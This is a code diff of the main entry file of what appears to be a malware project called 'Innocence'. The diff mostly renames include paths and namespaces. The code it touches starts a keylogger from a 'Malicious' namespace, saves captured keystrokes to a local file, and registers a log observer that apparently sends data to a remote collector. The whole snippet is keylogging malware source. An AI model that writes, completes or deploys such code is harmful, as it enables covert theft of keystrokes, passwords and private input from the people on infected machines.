@@ -1,17 +1,17 @@
-#include <common/Log.hpp>
+#include <log/Log.hpp>
 #include <malicious/Keylogger.hpp>
 #include <system/Process.hpp>
 using namespace System;
 using namespace Malicious;
 
-#include <Innocence.hpp>
+#include <common/Innocence.hpp>
 
 int main()
 {
     TRACE_FUNCTION
-	LOG.setIdentity(Innocence::identity);
-    LOG.addObserver(new Common::LogToConsole);
-    LOG.addObserver(new Common::LogToCollector);
+	LOG.setIdentity(Common::identity);
+    LOG.addObserver(new Log::LogToConsole);
+    LOG.addObserver(new Log::LogToCollector);
     Keylogger::instance().setKeylog("C:\\innocence\\output.txt");
     Keylogger::instance().start();
 	system("pause");
